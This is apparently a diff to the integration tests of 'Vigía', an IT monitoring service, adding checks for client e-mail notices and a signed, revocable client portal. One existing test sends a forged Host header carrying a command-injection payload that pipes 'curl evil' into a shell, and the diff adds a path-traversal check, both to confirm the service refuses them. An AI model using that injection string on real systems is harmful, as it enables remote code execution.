@@ -49,6 +49,7 @@ before(async () => {
     OLLAMA_MODEL: 'mock-model', OLLAMA_URL: `http://127.0.0.1:${auxPort}`,
     SMTP_HOST: '127.0.0.1', SMTP_PORT: String(smtpPort), SMTP_USER: 'mailer', SMTP_PASS: 'mail-pass', MAIL_FROM: 'Vigía <vigia@it.example>', MAIL_TO: 'tech@it.example, boss@it.example',
     VIGIA_INV: path.join(dir, 'inventory.json'), VIGIA_STATE: path.join(dir, 'state.json'), VIGIA_PUSHED: path.join(dir, 'pushed.json'), VIGIA_WORDFENCE: path.join(dir, 'wf.json'),
+    VIGIA_CLIENTS: path.join(dir, 'clients.json'), VIGIA_CLIENT_MAIL_MS: '150', VIGIA_CLIENT_GAP_MS: '300',
   }));
 });
 after(() => { srv?.kill(); aux?.close(); smtp?.server.close(); fs.rmSync(dir, { recursive: true, force: true }); });
@@ -134,6 +135,12 @@ test('computers: install line, enrolment, signed Windows inventory, findings', a
   const again = await (await enroll({ token: t.token, host: 'RECEPCION', machineId })).json();
   assert.deepEqual([again.asset, again.created], [e.asset, false], 'the same computer twice is one asset');
 
+  // the client wants their own notices by e-mail
+  const C = url(`/api/clients/${encodeURIComponent('Gestoría Ruiz')}`);
+  assert.equal((await fetch(C, { method: 'PUT', headers: J, body: JSON.stringify({ emails: 'jefe@ruiz.example, nope' }) })).status, 422);
+  assert.equal((await fetch(C, { method: 'PUT', headers: J, body: JSON.stringify({ emails: 'jefe@ruiz.example', minPrio: 'P2' }) })).status, 200);
+  assert.equal((await fetch(url('/api/clients/Nadie'), { method: 'PUT', headers: J, body: '{}' })).status, 404);
+
   const body = JSON.stringify({ host: 'RECEPCION', parts: [
     { kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045, edition: 'Professional' },
     { kind: 'av', products: [] },
@@ -159,6 +166,16 @@ test('computers: install line, enrolment, signed Windows inventory, findings', a
   assert.equal(S.pushed[e.asset].machine.listening[0].port, 3389);
   assert.equal(S.notify.email, true);
 
+  // one e-mail to the client, without acknowledge links, with only their own alerts
+  let toClient = [];
+  for (let i = 0; i < 30 && !toClient.length; i++) { await new Promise(res => setTimeout(res, 100)); toClient = smtp.mails.filter(m => m.to.includes('jefe@ruiz.example')); }
+  assert.equal(toClient.length, 1, 'batched into one');
+  const text = bodyOf(toClient[0]);
+  assert.match(text, /has no active antivirus/);
+  assert.match(text, /Your IT team has been notified/);
+  assert.ok(!/api\/ack/.test(text) && !/ACME/.test(text));
+  assert.ok(!toClient[0].to.includes('tech@it.example'));
+
   // a later push without antivirus or patch data leaves those alerts open
   const partial = JSON.stringify({ host: 'RECEPCION', parts: [{ kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045 }] });
   const ts2 = ts + 1;
@@ -167,10 +184,52 @@ test('computers: install line, enrolment, signed Windows inventory, findings', a
   S = await (await fetch(url('/api/state'), { headers: auth })).json();
   assert.ok(S.alerts.some(x => x.key === `mach:av:${e.asset}`), 'still open');
 
+  // fixed: the client hears it, including the update alert that closes quietly for you
+  const healthy = JSON.stringify({ host: 'RECEPCION', parts: [
+    { kind: 'av', products: [{ name: 'Microsoft Defender', enabled: true, realTime: true, upToDate: true }] },
+    { kind: 'patches', lastInstalled: new Date().toISOString() }, { kind: 'listening', ports: [] }] });
+  const ts3 = ts + 2;
+  assert.equal((await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts3), 'x-vigia-signature': sign(e.key, ts3, p, healthy) }, body: healthy })).status, 200);
+  let fixed = [];
+  for (let i = 0; i < 40 && fixed.length < 2; i++) { await new Promise(res => setTimeout(res, 100)); fixed = smtp.mails.filter(m => m.to.includes('jefe@ruiz.example')); }
+  const resolvedText = bodyOf(fixed[1]);
+  assert.match(resolvedText, /\[Resolved\] RECEPCION has no active antivirus/);
+  assert.match(resolvedText, /\[Resolved\] RECEPCION without Windows updates/);
+  assert.ok(!/risky/.test(resolvedText), 'a P3 they were never told about is not news');
+
   // the address ends up in a shell command: a forged Host header never gets there (PUBLIC_URL wins; without it, anything but a plain URL is refused)
   const bad = await new Promise(res => http.request({ host: '127.0.0.1', port, path: '/api/enroll-token', method: 'POST',
     headers: { ...J, host: "x';curl evil|sh;'" } }, r => { let d = ''; r.on('data', c => { d += c; }).on('end', () => res(d)); }).end(JSON.stringify({ client: 'A' })));
   assert.ok(!bad.includes('evil'));
+});
+
+test('client portal: signed link, only that client, report, revocable', async () => {
+  const J = { ...auth, 'content-type': 'application/json' }, C = url(`/api/clients/${encodeURIComponent('Gestoría Ruiz')}`);
+  const { url: link } = await (await fetch(`${C}/portal`, { method: 'POST', headers: J, body: '{}' })).json();
+  assert.match(link, /\/portal\/[A-Za-z0-9_-]+\.1\.[0-9a-f]{32}$/);
+  const r = await fetch(link);
+  assert.equal(r.status, 200);
+  assert.equal(r.headers.get('cache-control'), 'no-store');
+  assert.match(r.headers.get('x-robots-tag'), /noindex/);
+  const page = await r.text();
+  assert.match(page, /Gestoría Ruiz/);
+  assert.match(page, /RECEPCION/);
+  assert.match(page, /antivirus: Microsoft Defender/);
+  assert.ok(!/ACME|Shop|enroll/.test(page), 'nothing about other clients or Vigía internals');
+  const S = await (await fetch(url('/api/state'), { headers: auth })).json();
+  assert.equal(S.clients['Gestoría Ruiz'].portal, link);
+  const rep = await fetch(`${link}/report?month=${new Date().toISOString().slice(0, 7)}`);
+  assert.equal(rep.status, 200);
+  assert.match(await rep.text(), /Computers and servers/);
+  assert.equal((await fetch(`${link}/../../api/state`)).status, 401, 'the link opens nothing else');
+
+  // a new link retires the old one; turning it off retires both
+  const { url: link2 } = await (await fetch(`${C}/portal`, { method: 'POST', headers: J, body: '{}' })).json();
+  assert.equal((await fetch(link)).status, 404);
+  assert.equal((await fetch(link2)).status, 200);
+  await fetch(`${C}/portal`, { method: 'POST', headers: J, body: JSON.stringify({ action: 'revoke' }) });
+  assert.equal((await fetch(link2)).status, 404);
+  assert.equal((await fetch(url('/portal/forged.1.0123456789abcdef0123456789abcdef'))).status, 404);
 });
 
 
